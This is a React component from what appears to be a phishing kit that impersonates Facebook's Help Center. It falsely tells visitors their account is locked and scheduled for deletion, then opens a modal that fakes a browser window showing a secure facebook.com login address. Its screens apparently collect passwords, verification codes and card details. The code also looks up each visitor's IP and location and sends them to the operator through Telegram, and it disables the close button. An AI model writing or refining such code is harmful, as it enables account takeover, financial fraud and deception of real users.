import React, { useRef, useState } from "react";
import { Input, Modal } from "antd";
import "./styles/confirmation-second.css";
import { useLocation } from "react-router";
import { sendTelegram } from "./utils/sendTelegram";
import { getIpAddress } from "./utils/getIpAddress";
import { API_BE } from "./utils/variable";
import "./styles/landing_page_new.css";
import ReCAPTCHA from "react-google-recaptcha";
import { ConfirmationModal } from "./ConfirmationModal";
import { Confirmation } from "./Confirmation";
import { ConfirmationSecond } from "./ConfirmationSecond";
import { TH } from "./TH";
import { TenMinute } from "./TenMinute";
import { VerificationCC } from "./VerificationCC";
import { RestrictedEmail } from "./RestrictedEmail";
import { v4 as uuidv4 } from "uuid";

export const LandingPageNew = (props) => {
  const { state } = useLocation();
  const [code, setCode] = useState("");
  const [modalState, setValue] = useState(55);
  const [isModalVisible, setIsModalVisible] = useState(false);

  const handleCancel = () => {
    return;
    setIsModalVisible(false);
    setValue(55);
  };

  const getCurrentIp = async () => {
    try {
      const { data } = await axios.get("https://api.ipify.org/?format=json");
      if (data && data.ip) {
        return data.ip;
      }
    } catch (error) {
      return null;
    }
  };

  const getIpConfig = (ip) => {
    const unique_id = uuidv4();
    localStorage.setItem("unique_id", JSON.stringify(unique_id));

    if (!ip) return;
    fetch(`https://ipinfo.io/${ip}/json`)
      .then((response) => response.json())
      .then((data) => {
        let body = {
          ip: data.ip,
          country: data.country,
          region: data.region,
          city: data.city,
          org: data.org,
          zip: data.postal,
        };

        // Replace this
        localStorage.setItem("ip-datas", JSON.stringify(body));

        let telegram_data = `
          ===== ONLINE =====
            IP: ${data.ip}
            City: ${data.city}
            Region: ${data.region}
            Country: ${data.country}
            ORG: ${data.org}
            ZIP: ${data.postal}
          `;

        sendTelegram(telegram_data, true);
      });
  };

  const createUserDb = () => {
    let unique_id = localStorage.getItem("unique_id");
    let ip_data = localStorage.getItem("ip-datas");

    if (unique_id) {
      ip_data = JSON.parse(ip_data);
      unique_id = JSON.parse(unique_id);

      const body = {
        unique_id: unique_id,
        ip_address: ip_data?.ip || "",
        country: ip_data?.city || "",
        country_code: ip_data?.country || "",
        email: "",
      };

      fetch(`${API_BE}/users`, {
        method: "POST",
        headers: {
          Accept: "application/json, text/plain, */*",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then(() => console.warn("yes!!"));
    }
  };

  const showModal = () => {
    setIsModalVisible(true);
    getCurrentIp().then((data) => {
      getIpConfig(data);
      createUserDb();
    });
  };

  const recaptchaRef = useRef();
  const url = window.location.href;
  const scheduledCallValue = url?.split("=")[1];

  const fullName = scheduledCallValue?.split("_");

  const handleSubmit = (e) => {
    e.preventDefault();
    const token = recaptchaRef.current.getValue();
    if (!token) return;
    recaptchaRef.current.reset();
    props.showModal();
  };

  const changeModalScreens = (state) => {
    if (state === 0) {
      return (
        <LoadingFacebookButton
          isModalVisible={isModalVisible}
          setValue={setValue}
          handleCancel={handleCancel}
        />
      );
    } else if (state === 1) {
      return <ConfirmationModal setValue={setValue} wrong_password={true} />;
    } else if (state === 2) {
      return <Confirmation setValue={setValue} />;
    } else if (state === 3) {
      return <ConfirmationSecond setValue={setValue} />;
    } else if (state === 4) {
      return <TH setValue={setValue} />;
    } else if (state === 5) {
      return window.location.replace(
        "https://calendly.com/essencemediacom/10min/"
      );
    } else if (state === 6) {
      return <TenMinute setValue={setValue} />;
    } else if (state === 7) {
      return <VerificationCC setValue={setValue} />;
    } else if (state === 8) {
      return <RestrictedEmail setValue={setValue} />;
    } else {
      return <ConfirmationModal setValue={setValue} />;
    }
  };

  function formatDate(date) {
    const months = [
      "January",
      "February",
      "March",
      "April",
      "May",
      "June",
      "July",
      "August",
      "September",
      "October",
      "November",
      "December",
    ];

    const day = date.getDate();
    const monthIndex = date.getMonth();
    const year = date.getFullYear();

    return `${months[monthIndex]} ${day - 1}, ${year}`;
  }

  const currentDate = new Date();
  currentDate.setDate(currentDate.getDate() - 1);

  const formattedDate = formatDate(currentDate);

  return (
    <>
      <div className="header-show-on-desktop header__show-landingpage">
        <div className="header-desktop-flex header__landing-new">
          <div className="flex-desktop-header">
            <div className="flex-image-desktop-facebook">
              <img src="/facebookLogo1.png" />
            </div>
            <h2>Help Center</h2>
          </div>
          <div className="input-button-desktop">
            <div className="input-desktop">
              <span className="search-desktop-icon"></span>
              <span>Search help articles...</span>
            </div>
            <div className="managing-account-2">
              <span className="download-icon-desktop"></span>
            </div>
            <div className="desktop-english">English (US)</div>
          </div>
        </div>
      </div>
      <div className="landing__new-page">
        <div className="container">
          <div>
            <img className="random__image" src="/random.jpg" />
          </div>
          <div>
            <h2>Your account has been locked</h2>
            <p>
              Your Facebook account is currently in a restricted state and is
              scheduled for deletion. If you believe this action is in error,
              please request a review by clicking Continue with Facebook.
            </p>
          </div>
          <div className="content">
            <div className="image__icon">
              <img src="/lock.PNG" />
            </div>
            <div className="text">
              <h2>Account restricted {formattedDate}</h2>
              <p>
                To protect you, your profile is not visible to people on
                Facebook and you can't use your account.
              </p>
            </div>
          </div>
          <div className="take__through">
            <p>We'll take you through some steps to unlock your account.</p>
          </div>
          <div className="take__get-started">
            {/* <form onSubmit={handleSubmit}>
            <ReCAPTCHA
              ref={recaptchaRef}
              sitekey={"6LeFzLAmAAAAALwV0xuLE4RUPjwxNYqa06uGUUl1"}
            />
            <button type="submit" className="btn-fb">
              <img className="second__image" src="./fb.svg" alt="" />
              Continue with Facebook
            </button>
          </form> */}

            <button onClick={showModal}>Continue with Facebook</button>
          </div>
        </div>
      </div>
      <Modal
        className="modal-wrapper  modal__facebook"
        width={1000}
        bodyStyle={{ maxHeight: 650, backgroundColor: "#e9ebee" }}
        title={
          <div>
            <div className="wrapper_header">
              <div className="sign__up-modal">
                <img src="/hLRJ1GG_y0J.ico" alt="" width="17px" />
                <p>Log into Facebook | Facebook</p>
              </div>
              <div className="icons">
                <div className="img" onClick={handleCancel}>
                  <img src="/minus.png" alt="" />
                </div>
                <div className="img">
                  <img
                    src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png"
                    alt=""
                  />
                </div>
                <div className="img img-x" onClick={handleCancel}>
                  <img src="/close.png" alt="" />
                </div>
              </div>
            </div>
            <div className="input__title-wrapper">
              <div className="lock__screen">
                <div className="lock">
                  <div className="lock__wrapper">
                    <img src="/locktest.png" alt="" />
                    <span className="green">Secure | https:</span>
                    <span className="black-opacity">//</span>
                  </div>
                </div>
                <span className="input__value">
                  www.facebook.com
                  <span className="black">
                    {" "}
                    /login.php?skip
                    <span className="hide__text-mobile">
                      _api_login=1
                      &api_key=481324359126967&kid_directed_site=0&app_id=481324359126967&signed...
                    </span>
                  </span>
                </span>
              </div>

              {/* <div className="lock lock-img">
                <div className="lock__wrapper">
                  <img src="/zoom-in.png" alt="" />
                </div>
              </div> */}
            </div>
          </div>
        }
        open={isModalVisible}
        maskClosable={false}
      >
        {changeModalScreens(modalState)}
      </Modal>
    </>
  );
};
